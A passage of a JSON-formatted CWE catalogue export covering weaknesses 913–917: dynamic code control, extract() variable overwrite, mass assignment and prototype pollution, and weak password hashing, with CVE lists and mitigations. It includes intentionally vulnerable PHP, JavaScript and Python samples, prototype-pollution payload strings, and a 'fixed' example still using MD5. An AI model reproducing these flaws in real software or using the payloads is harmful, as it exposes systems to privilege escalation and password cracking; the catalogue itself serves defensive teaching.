firmware Ver. 1.49 and earlier, WHR-G300N firmware Ver. 1.65 and earlier, WHR-G301N firmware Ver. 1.87 and earlier, WHR-G54S firmware Ver. 1.43 and earlier, WHR-G54S-NI firmware Ver. 1.24 and earlier, WHR-HP-AMPG firmware Ver. 1.43 and earlier, WHR-HP-G firmware Ver. 1.49 and earlier, WHR-HP-G54 firmware Ver. 1.43 and earlier, WLI-H4-D600 firmware Ver. 1.88 and earlier, WLI-TX4-AG300N firmware Ver. 1.53 and earlier, WS024BF firmware Ver. 1.60 and earlier, WS024BF-NW firmware Ver. 1.60 and earlier, WZR2-G108 firmware Ver. 1.33 and earlier, WZR2-G300N firmware Ver. 1.55 and earlier, WZR-450HP-CWT firmware Ver. 2.00 and earlier, WZR-450HP-UB firmware Ver. 2.00 and earlier, WZR-600DHP2 firmware Ver. 1.15 and earlier, WZR-AGL300NH firmware Ver. 1.55 and earlier, WZR-AMPG144NH firmware Ver. 1.49 and earlier, WZR-AMPG300NH firmware Ver. 1.51 and earlier, WZR-D1100H firmware Ver. 2.00 and earlier, WZR-G144N firmware Ver. 1.48 and earlier, WZR-G144NH firmware Ver. 1.48 and earlier, WZR-HP-G300NH firmware Ver. 1.84 and earlier, WZR-HP-G301NH firmware Ver. 1.84 and earlier, and WZR-HP-G450H firmware Ver. 1.90 and earlier."}, {"Reference": "CVE-2022-43464", "Description": "Hidden functionality vulnerability in UDR-JA1604/UDR-JA1608/UDR-JA1616 firmware versions 71x10.1.107112.43A and earlier allows a remote authenticated attacker to execute an arbitrary OS command on the device or alter the device settings."}, {"Reference": "CVE-2022-43486", "Description": "Hidden functionality vulnerability in Buffalo network devices allows a network-adjacent attacker with an administrative privilege to enable the debug functionalities and execute an arbitrary command on the affected devices."}, {"Reference": "CVE-2022-1741", "Description": "The tested version of Dominion Voting Systems ImageCast X has a Terminal Emulator application which could be leveraged by an attacker to gain elevated privileges on a device and/or install malicious code."}, {"Reference": "CVE-2022-31260", "Description": "In Montala ResourceSpace through 9.8 before r19636, csv_export_results_metadata.php allows attackers to export collection metadata via a non-NULL k value."}, {"Reference": "CVE-2022-26581", "Description": "PAX A930 device with PayDroid_7.1.1_Virgo_V04.3.26T1_20210419 can allow an unauthorized attacker to perform privileged actions through the execution of specific binaries listed in ADB daemon. The attacker must have physical USB access to the device in order to exploit this vulnerability."}, {"Reference": "CVE-2022-29855", "Description": "Mitel 6800 and 6900 Series SIP phone devices through 2022-04-27 have \"undocumented functionality.\" A vulnerability in Mitel 6800 Series and 6900 Series SIP phones excluding 6970, versions 5.1 SP8 (5.1.0.8016) and earlier, and 6.0 (6.0.0.368) through 6.1 HF4 (6.1.0.165), could allow a unauthenticated attacker with physical access to the phone to gain root access due to insufficient access control for test functionality during system startup. A successful exploit could allow access to sensitive information and code execution."}]}
{"ID": "913", "Name": "Improper Control of Dynamically-Managed Code Resources", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements.", "ExtendedDescription": "Many languages offer powerful features that allow the programmer to dynamically create or modify existing code, or resources used by code such as variables and objects. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can directly influence these code resources in unexpected ways.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Execute Unauthorized Code or Commands"]}, {"Scope": ["Other", "Integrity"], "Impact": ["Varies by Context", "Alter Execution Logic"]}], "DetectionMethods": [{"DetectionMethodID": "DM-13", "Method": "Fuzzing", "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "For any externally-influenced input, check the input against an allowlist of acceptable values."}, {"Phase": ["Implementation", "Architecture and Design"], "Strategy": "Refactoring", "Description": "Refactor the code so that it does not need to be dynamically managed."}], "ObservedExamples": [{"Reference": "CVE-2022-2054", "Description": "Python compiler uses eval() to execute malicious strings as Python code.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-2054"}, {"Reference": "CVE-2018-1000613", "Description": "Cryptography API uses unsafe reflection when deserializing a private key", "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1000613"}, {"Reference": "CVE-2015-8103", "Description": "Deserialization issue in commonly-used Java library allows remote execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2015-8103"}, {"Reference": "CVE-2006-7079", "Description": "Chain: extract used for register_globals compatibility layer, enables path traversal (CWE-22)", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7079"}, {"Reference": "CVE-2012-2055", "Description": "Source version control product allows modification of trusted key using mass assignment.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2055"}], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Top25Examples": [{"Reference": "CVE-2022-40634", "Description": "Improper Control of Dynamically-Managed Code Resources vulnerability in Crafter Studio of Crafter CMS allows authenticated developers to execute OS commands via FreeMarker SSTI."}, {"Reference": "CVE-2022-25355", "Description": "EC-CUBE 3.0.0 to 3.0.18-p3 and EC-CUBE 4.0.0 to 4.1.1 improperly handle HTTP Host header values, which may lead a remote unauthenticated attacker to direct the vulnerable version of EC-CUBE to send an Email with some forged reissue-password URL to EC-CUBE users."}]}
{"ID": "914", "Name": "Improper Control of Dynamically-Identified Variables", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not properly restrict reading from or writing to dynamically-identified variables.", "ExtendedDescription": "Many languages offer powerful features that allow the programmer to access arbitrary variables that are specified by an input string. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can modify unintended variables that have security implications.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "99", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "913", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "An attacker could modify sensitive data or program variables."}, {"Scope": ["Integrity"], "Impact": ["Execute Unauthorized Code or Commands"]}, {"Scope": ["Other", "Integrity"], "Impact": ["Varies by Context", "Alter Execution Logic"]}], "PotentialMitigations": [{"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "For any externally-influenced input, check the input against an allowlist of internal program variables that are allowed to be modified."}, {"Phase": ["Implementation", "Architecture and Design"], "Strategy": "Refactoring", "Description": "Refactor the code so that internal program variables do not need to be dynamically identified."}], "DemonstrativeExamples": [{"ID": "DX-107", "Entries": [{"IntroText": "This code uses the credentials sent in a POST request to login a user."}, {"Nature": "Bad", "Language": "PHP", "ExampleCode": "```\n```\n//Log user in, and set $isAdmin to true if user is an administrator* \n\t\n\tfunction login($user,$pass){\n\t```\n\t\t$query = buildQuery($user,$pass);\n\t\tmysql_query($query);\n\t\tif(getUserRole($user) == \"Admin\"){\n\t\t\t$isAdmin = true;\n\t\t}\n\t}\n\t$isAdmin = false;\n\textract($_POST);\n\tlogin(mysql_real_escape_string($user),mysql_real_escape_string($pass));\n```"}, {"BodyText": "The call to extract() will overwrite the existing values of any variables defined previously, in this case $isAdmin. An attacker can send a POST request with an unexpected third value \"isAdmin\" equal to \"true\", thus gaining Admin privileges."}]}], "ObservedExamples": [{"Reference": "CVE-2006-7135", "Description": "extract issue enables file inclusion", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7135"}, {"Reference": "CVE-2006-7079", "Description": "Chain: extract used for register_globals compatibility layer, enables path traversal (CWE-22)", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7079"}, {"Reference": "CVE-2007-0649", "Description": "extract() buried in include files makes post-disclosure analysis confusing; original report had seemed incorrect.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0649"}, {"Reference": "CVE-2006-6661", "Description": "extract() enables static code injection", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6661"}, {"Reference": "CVE-2006-2828", "Description": "import_request_variables() buried in include files makes post-disclosure analysis confusing", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-2828"}, {"Reference": "CVE-2009-0422", "Description": "Chain: Dynamic variable evaluation allows resultant remote file inclusion and path traversal.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0422"}, {"Reference": "CVE-2007-2431", "Description": "Chain: dynamic variable evaluation in PHP program used to modify critical, unexpected $_SERVER variable for resultant XSS.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-2431"}, {"Reference": "CVE-2006-4904", "Description": "Chain: dynamic variable evaluation in PHP program used to conduct remote file inclusion.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4904"}, {"Reference": "CVE-2006-4019", "Description": "Dynamic variable evaluation in mail program allows reading and modifying attachments and preferences of other users.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4019"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "915", "Name": "Improperly Controlled Modification of Dynamically-Determined Object Attributes", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.", "ExtendedDescription": "\n\nIf the object contains attributes that were only intended for internal use, then their unexpected modification could lead to a vulnerability.\n\n\nThis weakness is sometimes known by the language-specific mechanisms that make it possible, such as mass assignment, autobinding, or object injection.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "913", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "502", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Ruby", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "ASP.NET", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Python", "Prevalence": "Undetermined"}, {"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Mass Assignment", "Description": "\"Mass assignment\" is the name of a feature in Ruby on Rails that allows simultaneous modification of multiple object attributes."}, {"Term": "AutoBinding", "Description": "The \"Autobinding\" term is used in frameworks such as Spring MVC and ASP.NET MVC."}, {"Term": "PHP Object Injection", "Description": "Some PHP application researchers use this term for attacking unsafe use of the unserialize() function, but it is also used for CWE-502."}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "An attacker could modify sensitive data or program variables."}, {"Scope": ["Integrity"], "Impact": ["Execute Unauthorized Code or Commands"]}, {"Scope": ["Other", "Integrity"], "Impact": ["Varies by Context", "Alter Execution Logic"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "\n\nIf available, use features of the language or framework that allow specification of allowlists of attributes or fields that are allowed to be modified. If possible, prefer allowlists over denylists.\n\n\nFor applications written with Ruby on Rails, use the attr_accessible (allowlist) or attr_protected (denylist) macros in each class that may be used in mass assignment.\n"}, {"Phase": ["Architecture and Design", "Implementation"], "Description": "If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified."}, {"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "For any externally-influenced input, check the input against an allowlist of internal object attributes or fields that are allowed to be modified."}, {"Phase": ["Implementation", "Architecture and Design"], "Strategy": "Refactoring", "Description": "Refactor the code so that object attributes or fields do not need to be dynamically identified, and only expose getter/setter functionality for the intended attributes."}], "DemonstrativeExamples": [{"ID": "DX-206", "Entries": [{"IntroText": "This function sets object attributes based on a dot-separated path."}, {"Nature": "Bad", "Language": "JavaScript", "ExampleCode": "```\n\tfunction setValueByPath (object, path, value) {\n\t\t const pathArray = path.split(\".\");\n\t\t const attributeToSet = pathArray.pop();\n\t\t let objectToModify = object;\n\t\t for (const attr of pathArray) {\n\t\t\tif (typeof objectToModify[attr] !== 'object') {\n\t\t\t\tobjectToModify[attr] = {};\n\t\t\t\t }\n\t\t\t objectToModify = objectToModify[attr];\n\t\t\t }\n\t\t objectToModify[attributeToSet] = value;\n\t\t return object;\n\t\t }\n```"}, {"BodyText": "This function does not check if the attribute resolves to the object prototype. These codes can be used to add \"isAdmin: true\" to the object prototype."}, {"Nature": "Bad", "Language": "JavaScript", "ExampleCode": "```\n\t setValueByPath({}, \"__proto__.isAdmin\", true)\n\t setValueByPath({}, \"constructor.prototype.isAdmin\", true)\n```"}, {"BodyText": "By using a denylist of dangerous attributes, this weakness can be eliminated."}, {"Nature": "Good", "Language": "JavaScript", "ExampleCode": "```\n\t function setValueByPath (object, path, value) {\n\t\t const pathArray = path.split(\".\");\n\t\t const attributeToSet = pathArray.pop();\n\t\t let objectToModify = object;\n\t\t for (const attr of pathArray) {\n```\n// Ignore attributes which resolve to object prototype* \n\t\t\t if (attr === \"__proto__\" || attr === \"constructor\" || attr === \"prototype\") {\n\t\t\t\n\t\t\t```\n\t\t\t\t continue;\n\t\t\t\t }\n\t\t\t if (typeof objectToModify[attr] !== \"object\") {\n\t\t\t\t objectToModify[attr] = {};\n\t\t\t\t }\n\t\t\t objectToModify = objectToModify[attr];\n\t\t\t }\n\t\t objectToModify[attributeToSet] = value;\n\t\t return object;\n\t\t }\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2024-3283", "Description": "Application for using LLMs allows modification of a sensitive variable using mass assignment.", "Link": "https://www.cve.org/CVERecord?id=CVE-2024-3283"}, {"Reference": "CVE-2012-2054", "Description": "Mass assignment allows modification of arbitrary attributes using modified URL.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2054"}, {"Reference": "CVE-2012-2055", "Description": "Source version control product allows modification of trusted key using mass assignment.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-2055"}, {"Reference": "CVE-2008-7310", "Description": "Attackers can bypass payment step in e-commerce product.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-7310"}, {"Reference": "CVE-2013-1465", "Description": "Use of PHP unserialize function on untrusted input allows attacker to modify application configuration.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-1465"}, {"Reference": "CVE-2012-3527", "Description": "Use of PHP unserialize function on untrusted input in content management system might allow code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-3527"}, {"Reference": "CVE-2012-0911", "Description": "Use of PHP unserialize function on untrusted input in content management system allows code execution using a crafted cookie value.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"}, {"Reference": "CVE-2012-0911", "Description": "Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"}, {"Reference": "CVE-2011-4962", "Description": "Content management system written in PHP allows code execution through page comments.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-4962"}, {"Reference": "CVE-2009-4137", "Description": "Use of PHP unserialize function on cookie value allows remote code execution or upload of arbitrary files.", "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4137"}, {"Reference": "CVE-2007-5741", "Description": "Content management system written in Python interprets untrusted data as pickles, allowing code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5741"}, {"Reference": "CVE-2011-2520", "Description": "Python script allows local users to execute code via pickled data.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-2520"}, {"Reference": "CVE-2005-2875", "Description": "Python script allows remote attackers to execute arbitrary code using pickled objects.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2875"}, {"Reference": "CVE-2013-0277", "Description": "Ruby on Rails allows deserialization of untrusted YAML to execute arbitrary code.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-0277"}, {"Reference": "CVE-2011-2894", "Description": "Spring framework allows deserialization of objects from untrusted sources to execute arbitrary code.", "Link": "https://www.cve.org/CVERecord?id=CVE-2011-2894"}, {"Reference": "CVE-2012-1833", "Description": "Grails allows binding of arbitrary parameters to modify arbitrary object properties.", "Link": "https://www.cve.org/CVERecord?id=CVE-2012-1833"}, {"Reference": "CVE-2010-3258", "Description": "Incorrect deserialization in web browser allows escaping the sandbox.", "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3258"}, {"Reference": "CVE-2008-1013", "Description": "Media library allows deserialization of objects by untrusted Java applets, leading to arbitrary code execution.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1013"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Maintenance", "Note": "The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization."}], "Top25Examples": [{"Reference": "CVE-2022-3225", "Description": "Improper Control of Dynamically-Managed Code Resources in GitHub repository budibase/budibase prior to 1.3.20. "}]}
{"ID": "916", "Name": "Use of Password Hash With Insufficient Computational Effort", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.", "ExtendedDescription": "\n\nMany password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.\n\n\nMany hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.\n\n\nThere are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:\n\n\n  - The amount of CPU time required to compute the hash (\"stretching\")\n\n  - The amount of memory required to compute the hash (\"memory-hard\" operations)\n\n  - Including a random value, along with the password, as input to the hash computation (\"salting\")\n\n  - Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs (\"one-way\" hashing)\n\n  - Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs (\"collision resistance\")\n\nNote that the security requirements for the product may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "328", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "327", "ViewID": "1003", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Access Control"], "Impact": ["Bypass Protection Mechanism", "Gain Privileges or Assume Identity"], "Note": "If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes."}], "DetectionMethods": [{"Method": "Automated Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)", "Effectiveness": "High"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "High"}, {"Method": "Automated Static Analysis", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tConfiguration Checker", "Effectiveness": "SOAR Partial"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-51", "Phase": ["Architecture and Design"], "Description": "\n\nUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.\n\n\nSome hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.\n\n\nNote that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.\n", "Effectiveness": "High"}, {"MitigationID": "MIT-25", "Phase": ["Implementation", "Architecture and Design"], "Description": "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."}], "DemonstrativeExamples": [{"ID": "DX-207", "Entries": [{"IntroText": "In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\tdef storePassword(userName,Password):\n\t\thasher = hashlib.new('md5')\n\t\thasher.update(Password)\n\t\thashedPassword = hasher.digest()\n```\n# UpdateUserLogin returns True on success, False otherwise* \n\t\treturn updateUserLogin(userName,hashedPassword)"}, {"BodyText": "While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised."}, {"BodyText": "Fixing this is as simple as providing a salt to the hashing function on initialization:"}, {"Nature": "Good", "Language": "Python", "ExampleCode": "```\n\tdef storePassword(userName,Password):\n\t\thasher = hashlib.new('md5',b'SaltGoesHere')\n\t\thasher.update(Password)\n\t\thashedPassword = hasher.digest()\n```\n# UpdateUserLogin returns True on success, False otherwise* \n\t\treturn updateUserLogin(userName,hashedPassword)"}, {"BodyText": "Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327."}]}], "ObservedExamples": [{"Reference": "CVE-2008-1526", "Description": "Router does not use a salt with a hash, making it easier to crack passwords.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1526"}, {"Reference": "CVE-2006-1058", "Description": "Router does not use a salt with a hash, making it easier to crack passwords.", "Link": "https://www.cve.org/CVERecord?id=CVE-2006-1058"}, {"Reference": "CVE-2008-4905", "Description": "Blogging software uses a hard-coded salt when calculating a password hash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4905"}, {"Reference": "CVE-2002-1657", "Description": "Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1657"}, {"Reference": "CVE-2001-0967", "Description": "Server uses a constant salt when encrypting passwords, simplifying brute force attacks.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0967"}, {"Reference": "CVE-2005-0408", "Description": "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0408"}], "RelatedAttackPatterns": ["55"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2021-32997", "Description": "The affected Baker Hughes Bentley Nevada products (3500 System 1 6.x, Part No. 3060/00 versions 6.98 and prior, 3500 System 1, Part No. 3071/xx & 3072/xx versions 21.1 HF1 and prior, 3500 Rack Configuration, Part No. 129133-01 versions 6.4 and prior, and 3500/22M Firmware, Part No. 288055-01 versions 5.05 and prior) utilize a weak encryption algorithm for storage and transmission of sensitive data, which may allow an attacker to more easily obtain credentials used for access."}, {"Reference": "CVE-2022-0022", "Description": "Usage of a weak cryptographic algorithm in Palo Alto Networks PAN-OS software where the password hashes of administrator and local user accounts are not created with a sufficient level of computational effort, which allows for password cracking attacks on accounts in normal (non-FIPS-CC) operational mode. An attacker must have access to the account password hashes to take advantage of this weakness and can acquire those hashes if they are able to gain access to the PAN-OS software configuration. Fixed versions of PAN-OS software use a secure cryptographic algorithm for account password hashes. This issue does not impact Prisma Access firewalls. This issue impacts: PAN-OS 8.1 versions earlier than PAN-OS 8.1.21; All versions of PAN-OS 9.0; PAN-OS 9.1 versions earlier than PAN-OS 9.1.11; PAN-OS 10.0 versions earlier than PAN-OS 10.0.7."}, {"Reference": "CVE-2022-23348", "Description": "BigAnt Software BigAnt Server v5.6.06 was discovered to utilize weak password hashes."}, {"Reference": "CVE-2022-26115", "Description": "A use of password hash with insufficient computational effort vulnerability [CWE-916] in FortiSandbox before 4.2.0 may allow an attacker with access to the password database to efficiently mount bulk guessing attacks to recover the passwords."}, {"Reference": "CVE-2022-40258", "Description": "AMI Megarac Weak password hashes for Redfish & API "}, {"Reference": "CVE-2022-24041", "Description": "A vulnerability has been identified in Desigo DXR2 (All versions < V01.21.142.5-22), Desigo PXC3 (All versions < V01.21.142.4-18), Desigo PXC4 (All versions < V02.20.142.10-10884), Desigo PXC5 (All versions < V02.20.142.10-10884). The web application stores the PBKDF2 derived key of users passwords with a low iteration count. An attacker with user profile access privilege can retrieve the stored password hashes of other accounts and then successfully perform an offline cracking attack and recover the plaintext passwords of other users."}]}
{"ID": "917", "Name": "Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.", "ExtendedDescription": "Frameworks such as Java Server Page (JSP) allow a developer to insert executable expressions within otherwise-static content. When the developer is not aware of the executable nature of these expressions and/or does not disable them, then if an attacker can inject expressions, this could lead to code execution or other unexpected behaviors.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "77", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "1336", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "74", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "77", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "77", "ViewID": "1340", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "EL Injection"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}, {"Scope": ["Integrity"], "Impact": ["Execute Unauthorized Code or 